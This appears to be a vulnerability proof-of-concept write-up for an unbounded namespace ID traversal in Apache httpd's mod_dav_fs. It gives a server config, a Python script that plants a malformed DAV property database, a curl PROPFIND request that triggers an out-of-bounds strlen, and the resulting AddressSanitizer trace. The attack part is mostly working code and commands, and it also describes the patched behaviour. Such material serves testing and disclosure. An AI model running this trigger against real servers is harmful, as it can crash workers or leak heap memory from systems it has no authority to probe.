# PoC 114 — Unbounded Namespace ID Traversal

`dav_set_name()` parses an integer namespace ID out of a DBM key and feeds
it to `dav_get_ns_table_uri()`, which walks the packed namespace table
`ns_id` times without bounds-checking against `db->ns_count`. A property
key naming a too-large namespace ID drives an out-of-bounds `strlen()`.

## Setup

`mod_dav` + `mod_dav_fs` (same baseline as PoC 112/113), httpd under ASan.

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule dav_module            modules/mod_dav.so
LoadModule dav_fs_module         modules/mod_dav_fs.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule unixd_module          modules/mod_unixd.so

DAVLockDB /tmp/davlock
DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    DAV On
    Require all granted
</Directory>
```

```bash
mkdir -p /tmp/htdocs/.DAV
touch /tmp/htdocs/file.txt
```

## Trigger

The property DB is iterated during a `PROPFIND` of *all* properties (keys
returned by `apr_dbm_firstkey/nextkey`). Plant a structurally well-formed
DB whose namespace table holds exactly one entry but whose stored property
key references namespace ID `2`:

`/tmp/plant_bad_nsid.py`:

```python
import dbm.ndbm, struct

DAV_DBVSN_MAJOR = 4
ns_count   = 1
ns_uri     = b"http://example.invalid/\x00"          # one NUL-terminated NS
metadata   = struct.pack(">HHH", DAV_DBVSN_MAJOR, 0, ns_count) + ns_uri
metadata   = metadata.ljust(12 + len(ns_uri), b"\x00")

# Property key format used by mod_dav_fs:
#   "<ns_id>:<localname>"
# Reference an out-of-range ns_id (2 with ns_count=1).
key   = b"2:badprop"
value = b"plain-text-property-value"

db = dbm.ndbm.open("/tmp/htdocs/.DAV/file.txt", "n")
db[b"METADATA"] = metadata
db[key]         = value
db.close()
```

```bash
python3 /tmp/plant_bad_nsid.py

curl -sv -X PROPFIND -H 'Depth: 0' \
     --data-binary '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' \
     -H 'Content-Type: application/xml' \
     http://127.0.0.1:8080/file.txt
```

## Observed effect

ASan reports during property enumeration:

```text
==1234==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 1
    #0 ... in __interceptor_strlen
    #1 dav_get_ns_table_uri  modules/dav/fs/dbm.c
    #2 dav_set_name          modules/dav/fs/dbm.c:701
    #3 dav_propdb_next_name  modules/dav/main/props.c
    #4 dav_method_propfind   modules/dav/main/mod_dav.c
```

Without ASan, the worker may segfault or return random URI bytes for the
namespace, both observable via the `PROPFIND` response or
`logs/error_log`. The patched build short-circuits with
`pname->ns = pname->name = NULL` for the out-of-range ID and
`PROPFIND` returns the resource with the malformed property suppressed.

## Marker

ASan trace pinning `__interceptor_strlen` -> `dav_get_ns_table_uri` ->
`dav_set_name` (`modules/dav/fs/dbm.c:701`).
